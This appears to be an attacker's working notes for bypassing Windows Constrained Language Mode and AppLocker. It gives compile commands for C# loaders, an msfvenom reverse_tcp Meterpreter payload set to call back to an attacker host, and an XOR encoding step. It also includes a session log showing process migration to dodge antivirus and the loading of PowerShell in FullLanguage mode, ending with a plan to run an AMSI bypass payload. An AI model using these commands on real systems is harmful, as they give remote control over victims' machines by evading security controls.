# clm and applocker bypass
# FOR Linux Compilation
```bash
sudo apt install mono-complete
mcs -r:System.Configuration.Install.dll applocker2.cs
```

# For windows Compilation

```bash
c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:"C:\windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" C:\users\dhanush\Desktop\bypassclm.cs
C:\Users\dhanush\Desktop>c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe c:\users\dhanush\Desktop\program3.cs
```

# ** HOST it in the Linux attacker machine**

# ✔️ ** Use only windows/meterpreter/reverse_tcp payload in this ,x64 payloads dont work with InstallUtil**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.130.136 LPORT=8999 -f raw > p.bin
python3 xorenc.py pa.bin
```

# **Have 2 sessions first create a process to migrate,and then use load powershell from meterpreter in the session ,dont spawn a new process**
```bash
execute -f notepad -H
Process 9252 created.
meterpreter > 
[*] 192.168.130.154 - Meterpreter session 10 closed.  Reason: Died

use 11
[-] Invalid module index: 11
msf6 exploit(multi/handler) > sessions -i 11
[*] Starting interaction with 11...

meterpreter > migrate 9252
[*] Migrating from 4952 to 9252...
[*] Migration completed successfully.
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > help

powershell_execute $ExecutionContext.SessionState.LanguageMode
[+] Command execution completed:
FullLanguage

meterpreter > powershell_shell
PS > $ExecutionContext.SessionState.LanguageMode
FullLanguage
PS > whoami
desktop-h4e2l8l\dhanush
PS > 
```

# ✔️ Commands
```bash
execute -f notepad -H #process gets killed because of antivirus
sessions -i 1 #New second Process
migrate 9525 #migrate to the newly created process from the last session
load powershell
powershell_execute $ExecutionContext.SessionState.LanguageMode
powershell_shell

#then we can run my amsi payload.
